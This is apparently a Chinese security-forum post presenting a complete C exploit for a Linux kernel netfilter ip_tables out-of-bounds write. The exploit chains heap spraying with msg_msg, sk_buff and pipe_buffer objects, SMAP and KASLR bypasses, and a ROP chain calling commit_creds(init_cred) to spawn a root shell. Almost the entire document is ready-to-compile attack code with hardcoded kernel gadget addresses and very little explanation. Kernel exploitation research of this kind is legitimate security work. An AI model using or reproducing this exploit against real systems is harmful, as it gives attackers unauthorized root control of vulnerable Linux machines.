[Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)](https://bbs.kanxue.com/elink@2ecK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1@1x3o6l9H3y4R3`.`.)

### (3)最终EXP

主要是[`bsauce`师傅的EXP](https://bbs.kanxue.com/elink@299K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6T1M7$3q4#2j5$3g2Q4x3V1k6C8k6i4u0F1k6h3I4Q4x3X3c8W2P5s2m8D9L8$3W2@1i4K6u0V1k6X3q4U0N6r3!0J5P5b7`.`.)和[`arttnba3`师傅的EXP](https://bbs.kanxue.com/elink@bc9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5k6h3y4F1i4K6u0r3x3U0l9J5x3W2)9J5c8U0l9@1i4K6u0r3x3o6q4Q4x3V1k6o6g2V1g2Q4x3X3b7H3h3o6l9%4i4K6u0V1b7#2k6q4i4K6u0V1x3U0l9J5x3g2)9J5k6o6t1J5y4e0f1#2i4K6u0r3i4K6t1K6c8X3W2F1j5h3I4Q4x3X3c8q4h3q4m8x3e0@1W2f1)，然后改巴改巴，加了点东西，替换了一下ROP链条什么的。

```c
// compile exp: $ gcc -m32 -static -masm=intel -o exploit exploit.c
#define _GNU_SOURCE

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netfilter_ipv4/ip_tables.h>

// clang-format on

#define PAGE_SIZE 0x1000
#define PRIMARY_SIZE 0x1000
#define SECONDARY_SIZE 0x400

#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define NUM_PIPEFDS 256
#define NUM_MSQIDS 4096

#define HOLE_STEP 1024

#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x1337

#define MSG_TAG 0xAAAAAAAA

// Gadget
#define PUSH_RSI_JMP_RSI_0x2E 0xffffffff81b4e244
#define ADD_RSP_0x98_RET 0xffffffff81a7895e
#define POP_RSP_RET 0xffffffff81900644
#define POP_RDI_RET 0xffffffff81001629
#define INIT_CRED 0xffffffff8244c8a0
#define COMMIT_CREDS 0xffffffff8108e690
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00df0

#define ANON_PIPE_BUF_OPS 0xffffffff82019340

// pt_regs
size_t user_cs, user_ss, user_sp, user_eflags;

// clang-format on

#define SKB_SHARED_INFO_SIZE 0x140
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))

// some struct
struct msg_msg {
    uint64_t m_list_next;
    uint64_t m_list_prev;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

struct msg_msgseg {
    uint64_t next;
};

struct pipe_buffer {
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

struct pipe_buf_operations {
    uint64_t confirm;
    uint64_t release;
    uint64_t steal;
    uint64_t get;
};

struct {
    long mtype;
    char mtext[PRIMARY_SIZE - MSG_MSG_SIZE];
} msg_primary;

struct {
    long mtype;
    char mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
} msg_secondary;

struct {
    long mtype;
    char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];
} msg_fake;

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
    msg->m_list_next = m_list_next;
    msg->m_list_prev = m_list_prev;
    msg->m_type = MTYPE_FAKE;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = 0;
}

void getRootShell(void) {
    if (getuid()) {
        printf("failed to gain the root!\n");
        exit(0);
    }
    printf("\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n");
    system("/bin/sh");
}

void saveStatus() {
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, esp;"
        "pushf;"
        "pop user_eflags;"
    );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
    *(long *)msgp = msgtyp;
    if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    return 0;
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (write(ss[i][0], buf, size) < 0) {
                perror("[-] write");
                return -1;
            }
        }
    }
    return 0;
}

int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) {
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (read(ss[i][1], buf, size) < 0) {
                perror("[-] read");
                return -1;
            }
        }
    }
    return 0;
}

int trigger_oob_write(int s) {
    struct __attribute__((__packed__)) {
        struct ipt_replace replace; // 0x60
        struct ipt_entry entry;     // 0x70
        struct xt_entry_match match; // 0x20
        char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2]; // kvmalloc_size = sizeof(xt_table_info) + ipt_replace->size = 0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2
        struct xt_entry_target target; // 0x20
    } data = {0};

    data.replace.num_counters = 1;
    data.replace.num_entries = 1;
    data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                         sizeof(data.pad) + sizeof(data.target)); // 0x70 + (0x108+0x1000-0x200-0x2) + 0x20 + 0x20 = 0xFB8 - 0x2

    data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                              sizeof(data.pad) + sizeof(data.target)); // Size of ipt_entry + matches + target
    data.entry.target_offset = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad)); // Size of ipt_entry + matches

    data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad)); // 0x20 + (0x108+0x1000-0x200-0x2) = 0xF28 - 0x2
    strcpy(data.match.u.user.name, "icmp");
    data.match.u.user.revision = 0;

    data.target.u.user.target_size = sizeof(data.target); // 0x20
    strcpy(data.target.u.user.name, "NFQUEUE");
    data.target.u.user.revision = 1;
    getchar();

    // Partially overwrite the adjacent buffer with 2 bytes of zero.
    if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
        if (errno == ENOPROTOOPT) {
            printf("[-] Error ip_tables module is not loaded.\n");
            return -1;
        }
    }

    return 0;
}

int setup_sandbox(void) {
    if (unshare(CLONE_NEWUSER) < 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        return -1;
    }
    if (unshare(CLONE_NEWNET) < 0) {
        perror("[-] unshare(CLONE_NEWNET)");
        return -1;
    }

    // bind the cpu0
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
        perror("[-] sched_setaffinity");
        return -1;
    }

    return 0;
}

int main(int argc, char *argv[]) {
    int s;
    int fd;
    int ss[NUM_SOCKETS][2];
    int pipefd[NUM_PIPEFDS][2];
    int msqid[NUM_MSQIDS];
    uint64_t *rop_chain;

    char primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];
    char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];

    struct msg_msg *msg;
    struct pipe_buf_operations *fake_pipe_buffer_ops;
    struct pipe_buffer *fake_pipe_buffer;

    uint64_t pipe_buffer_ops = 0;
    uint64_t kheap_addr = 0, kbase_addr = 0, kernel_offset = 0;

    int fake_idx = -1, real_idx = -1;

    saveStatus();
    printf("\033[32m\033[1m[+] STAGE 0: Initialization\033[0m\n");

    printf("[*] Setting up namespace sandbox...\n");
    if (setup_sandbox() < 0)
        goto err_no_rmid;

    printf("[*] Initializing sockets and message queues...\n");

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("[-] socket");
        goto err_no_rmid;
    }

    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
            perror("[-] socketpair");
            goto err_no_rmid;
        }
    }

    // 1. two bytes null write -> UAF
    // 1-1. gain 4096 msg queue
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
            perror("[-] msgget");
            goto err_no_rmid;
        }
    }

    printf("\n");
    printf("\033[32m\033[1m[+] STAGE 1: Memory corruption\033[0m\n");

    // 1-2. create 4096 primary msg —— size=0x1000
    printf("[*] Spraying primary messages...\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_primary, '\xdd', 0x100);
        *(int *)&msg_primary.mtext[0] = MSG_TAG;
        *(int *)&msg_primary.mtext[4] = i;
        if (write_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) < 0)
            goto err_rmid;
    }

    // 1-3. create 4096 secondary msg —— size=0x400
    printf("[*] Spraying secondary messages...\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_secondary, 0, sizeof(msg_secondary));
        *(int *)&msg_secondary.mtext[0] = MSG_TAG;
        *(int *)&msg_secondary.mtext[4] = i;
        if (write_msg(msqid[i], &msg_secondary, sizeof(msg_secondary),
                      MTYPE_SECONDARY) < 0)
            goto err_rmid;
    }

    // 1-4. release #1024/#2048/#3072 msg
    printf("[*] Creating holes in primary messages...\n");
    for (int i = HOLE_STEP; i < NUM_MSQIDS; i += HOLE_STEP) {
        if (read_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) < 0)
            goto err_rmid;
    }

    // 1-5. make xt_table_info struct take up the hole, and triger 2 bytes null write
    printf("[*] Triggering out-of-bounds write...\n");
    if (trigger_oob_write(s) < 0)
        goto err_rmid;

    // 1-6. find which msg is corrupted
    printf("[*] Searching for corrupted primary message...\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (i != 0 && (i % HOLE_STEP) == 0)
            continue;
        if (peek_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), 1) < 0)
            goto err_no_rmid;
        if (*(int *)&msg_secondary.mtext[0] != MSG_TAG) {
            printf("[-] Error could not corrupt any primary message.\n");
            goto err_no_rmid;
        }
        if (*(int *)&msg_secondary.mtext[4] != i) {
            fake_idx = i;
            real_idx = *(int *)&msg_secondary.mtext[4];
            break;
        }
    }

    if (fake_idx == -1 && real_idx == -1) {
        printf("[-] Error could not corrupt any primary message.\n");
        goto err_no_rmid;
    }

    // fake_idx's primary message has a corrupted next pointer; wrongly pointing to real_idx's secondary message.
    printf("[+] fake_idx: 0x%x\n", fake_idx);
    printf("[+] real_idx: 0x%x\n", real_idx);

    printf("\n");
    printf("\033[32m\033[1m[+] STAGE 2: SMAP bypass\033[0m\n");

    // 2. leak secondary msg address (kmalloc-0x400) -> forge msg_msg->m_list->next & prev
    // 2-1. free overlapped msg
    printf("[*] Freeing real secondary message...\n");
    if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary),
                 MTYPE_SECONDARY) < 0)
        goto err_rmid;

    // Reclaim the previously freed secondary message with a fake msg_msg of maximum possible size.
    // 2-2. spray and forge msg_msg (forge larger msg_msg->m_ts)
    printf("[*] Spraying fake secondary messages...\n");
    memset(secondary_buf, 0, sizeof(secondary_buf));
    build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                  PAGE_SIZE - MSG_MSG_SIZE, 0);
    if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
        goto err_rmid;

    // 2-2. leak heap pointer msg_msg->m_list->prev (kmalloc-0x1000)
    // Use the fake secondary message to read out-of-bounds.
    printf("[*] Leaking adjacent secondary message...\n");
    if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
        goto err_rmid;

    // Check if the leak is valid.
    if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {
        printf("[-] Error could not leak adjacent secondary message.\n");
        goto err_rmid;
    }

    // The secondary message contains a pointer to the primary message.
    msg = (struct msg_msg *)&msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
    kheap_addr = msg->m_list_next;
    if (kheap_addr & (PRIMARY_SIZE - 1))
        kheap_addr = msg->m_list_prev;
    printf("[+] kheap_addr: 0x%" PRIx64 "\n", kheap_addr);

    if ((kheap_addr & 0xFFFF000000000000) != 0xFFFF000000000000) {
        printf("[-] Error kernel heap address is incorrect.\n");
        goto err_rmid;
    }

    // 2-3. leak heap pointer msg_msg->m_list->prev (kmalloc-0x400) (forge msg_msg->next)
    printf("[*] Freeing fake secondary messages...\n");
    free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

    // Put kheap_addr at next to leak its content. Assumes zero bytes before kheap_addr.
    printf("[*] Spraying fake secondary messages...\n");
    memset(secondary_buf, 0, sizeof(secondary_buf));
    build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                  sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE); // fist 8 bytes must be NULL
    if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
        goto err_rmid;

    // Use the fake secondary message to read from kheap_addr.
    printf("[*] Leaking primary message...\n");
    if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
        goto err_rmid;

    // Check if the leak is valid.
    if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {
        printf("[-] Error could not leak primary message.\n");
        goto err_rmid;
    }

    // The primary message contains a pointer to the secondary message.
    msg = (struct msg_msg *)&msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];
    kheap_addr = msg->m_list_next;
    if (kheap_addr & (SECONDARY_SIZE - 1))
        kheap_addr = msg->m_list_prev;

    // Calculate the address of the fake secondary message.
    kheap_addr -= SECONDARY_SIZE;
    printf("[+] kheap_addr: 0x%" PRIx64 "\n", kheap_addr);

    if ((kheap_addr & 0xFFFF00000000FFFF) != 0xFFFF000000000000) {
        printf("[-] Error kernel heap address is incorrect.\n");
        goto err_rmid;
    }

    // 3. leak kernel base
    printf("\n");
    printf("\033[32m\033[1m[+] STAGE 3: KASLR bypass\033[0m\n");

    printf("[*] Freeing fake secondary messages...\n");
    free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

    // 3-1. forge msg_msg->m_list->next & prev so that list_del() does not crash.
    printf("[*] Spraying fake secondary messages...\n");
    memset(secondary_buf, 0, sizeof(secondary_buf));
    build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);
    if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
        goto err_rmid;

    // 3-2. free secondary msg
    printf("[*] Freeing sk_buff data buffer...\n");
    if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)
        goto err_rmid;

    // 3-3. spray pipe_buffer object
    printf("[*] Spraying pipe_buffer objects...\n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (pipe(pipefd[i]) < 0) {
            perror("[-] pipe");
            goto err_rmid;
        }
        // Write something to populate pipe_buffer.
        if (write(pipefd[i][1], "pwn", 3) < 0) {
            perror("[-] write");
            goto err_rmid;
        }
    }

    // 3-4. leak pipe_buffer->ops -> kernel base
    printf("[*] Leaking and freeing pipe_buffer object...\n");
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
                perror("[-] read");
                goto err_rmid;
            }
            if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)
                pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];
        }
    }

    kernel_offset = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
    kbase_addr = 0xffffffff81000000 + kernel_offset;
    printf("[+] anon_pipe_buf_ops: 0x%" PRIx64 "\n", pipe_buffer_ops);
    printf("[+] kbase_addr: 0x%" PRIx64 "\n", kbase_addr);

    if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000) {
        printf("[-] Error kernel base address is incorrect.\n");
        goto err_rmid;
    }

    // 4. hijack control-flow
    printf("\n");
    printf("\033[32m\033[1m[+] STAGE 4: Kernel code execution\033[0m\n");

    // 4-1. use skb to forge fake pipe_buffer
    printf("[*] Spraying fake pipe_buffer objects...\n");
    memset(secondary_buf, 0, sizeof(secondary_buf));

    // hijack rsp
    fake_pipe_buffer = (struct pipe_buffer *)&secondary_buf;
    fake_pipe_buffer->ops = kheap_addr;

    fake_pipe_buffer_ops = (struct pipe_buf_operations *)secondary_buf;
    fake_pipe_buffer_ops->release = kernel_offset + PUSH_RSI_JMP_RSI_0x2E;
    // fake_pipe_buffer_ops->confirm = kernel_offset + ADD_RSP_0x98_RET;

    uint64_t *mid_gadget;
    mid_gadget = (uint64_t *) (uint64_t *) &secondary_buf[0x2e];
    mid_gadget[0] = kernel_offset + POP_RSP_RET;

    // 4-2. construct ROP chain
    // build rop
    int rop_idx = 0;
    rop_chain = (uint64_t *) &secondary_buf[0xa0];
    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
    rop_chain[rop_idx++] = *(uint64_t *)"PIG007XX";
    rop_chain[rop_idx++] = *(uint64_t *)"PIG007XX";
    rop_chain[rop_idx++] = getRootShell;
    rop_chain[rop_idx++] = user_cs;
    rop_chain[rop_idx++] = user_eflags;
    rop_chain[rop_idx++] = user_sp;
    rop_chain[rop_idx++] = user_ss;

    if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
        goto err_rmid;

    // 4-3. trigger pipe_release()
    printf("[*] Releasing pipe_buffer objects...\n");
    printf("\n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (close(pipefd[i][0]) < 0) {
            perror("[-] close");
            goto err_rmid;
        }
        if (close(pipefd[i][1]) < 0) {
            perror("[-] close");
            goto err_rmid;
        }
    }
    return 0;

err_rmid:
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (i == fake_idx)
            continue;
        if (msgctl(msqid[i], IPC_RMID, NULL) < 0)
            perror("[-] msgctl");
    }

err_no_rmid:
    return 1;
}
```
